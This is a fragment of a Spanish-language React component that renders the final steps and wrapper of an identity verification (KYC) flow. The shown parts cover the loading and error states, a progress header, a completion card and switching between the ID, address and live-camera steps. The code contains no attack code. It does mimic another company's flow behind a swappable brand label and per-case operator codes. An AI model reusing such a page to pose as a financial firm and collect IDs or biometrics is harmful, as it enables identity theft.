              <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">DNI</p>
              <p className="mt-1 text-sm font-medium text-foreground">{dni || "—"}</p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );

  const renderDoneStep = () => (
    <Card className="mx-auto max-w-2xl border-border rounded-[32px] bg-card/95 shadow-sm">
      <CardContent className="p-8 text-center sm:p-10">
        <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-primary/12 text-primary">
          <CheckCircle2 className="h-10 w-10" />
        </div>
        <h1 className="mt-6 text-3xl font-semibold tracking-tight text-foreground">Verificación completada</h1>
        <p className="mx-auto mt-3 max-w-xl text-sm leading-relaxed text-muted-foreground">
          Tu validación fue finalizada correctamente y el caso ya quedó registrado para revisión.
        </p>

        <div className="mt-6 grid gap-3 text-left sm:grid-cols-2">
          <div className="rounded-2xl border border-border bg-background/70 p-4">
            <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Email</p>
            <p className="mt-1 text-sm font-medium text-foreground">{caseRecord?.email || "—"}</p>
          </div>
          <div className="rounded-2xl border border-border bg-background/70 p-4">
            <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Enviado</p>
            <p className="mt-1 text-sm font-medium text-foreground">
              {caseRecord?.submitted_at ? new Date(caseRecord.submitted_at).toLocaleString("es-AR") : "ahora"}
            </p>
          </div>
        </div>
      </CardContent>
    </Card>
  );

  if (loading) {
    return (
      <div className="flex min-h-[360px] items-center justify-center rounded-[32px] border border-border bg-card/95 text-foreground shadow-sm">
        <Loader2 className="h-5 w-5 animate-spin" />
      </div>
    );
  }

  if (!caseRecord || !caseRecord.email) {
    return (
      <Card className="w-full border-border rounded-[28px] bg-card/95 shadow-sm">
        <CardContent className="p-8 text-center">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-destructive/10 text-destructive">
            <AlertTriangle className="h-6 w-6" />
          </div>
          <h1 className="mt-5 text-2xl font-semibold text-foreground">Enlace no disponible</h1>
          <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
            Este caso no existe, fue cerrado o no tiene los datos mínimos para iniciar la verificación.
          </p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className={embedded ? "w-full" : "min-h-screen bg-background text-foreground"}>
      <main className={embedded ? "flex w-full flex-col gap-6" : "mx-auto flex w-full max-w-6xl flex-col gap-6 px-4 py-6 sm:px-6 lg:px-8 lg:py-8"}>
        <Card className="border-border rounded-[32px] bg-card/95 shadow-sm">
          <CardContent className="p-6 sm:p-7">
            <div className="flex flex-col gap-4 lg:flex-row lg:items-end lg:justify-between">
              <div>
                <p className="text-xs font-semibold uppercase tracking-[0.32em] text-primary">KYC integrado</p>
                <h1 className="mt-2 text-3xl font-semibold tracking-tight text-foreground sm:text-4xl">
                  Validación de seguridad {brandLabel}
                </h1>
                <p className="mt-2 max-w-2xl text-sm leading-relaxed text-muted-foreground">
                  Mantenemos el mismo paso a paso del flujo usado en Cocos: identidad, dirección y validación con cámara en vivo.
                </p>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <Badge variant="outline" className="border-primary/30 bg-primary/10 text-primary">
                  {step === "done" ? "Completado" : `Etapa ${currentStepIndex}/${stepOrder.length}`}
                </Badge>
                <Badge variant="outline">{caseRecord.email}</Badge>
              </div>
            </div>

            <div className="mt-6 grid gap-4 lg:grid-cols-[1fr_280px] lg:items-center">
              <div>
                <div className="mb-2 flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">Progreso del proceso</span>
                  <span className="font-medium text-foreground">{progressValue}%</span>
                </div>
                <Progress value={progressValue} className="h-2.5" />
              </div>

              <div className="rounded-2xl border border-border bg-background/60 px-4 py-3 text-sm text-muted-foreground">
                <span className="font-medium text-foreground">Operador:</span> {caseRecord.operator_code}
              </div>
            </div>
          </CardContent>
        </Card>

        {step === "verify" && renderVerifyStep()}
        {step === "address" && renderAddressStep()}
        {step === "biometric" && renderBiometricStep()}
        {step === "done" && renderDoneStep()}
      </main>
    </div>
  );
};

export default WayniKycFlow;
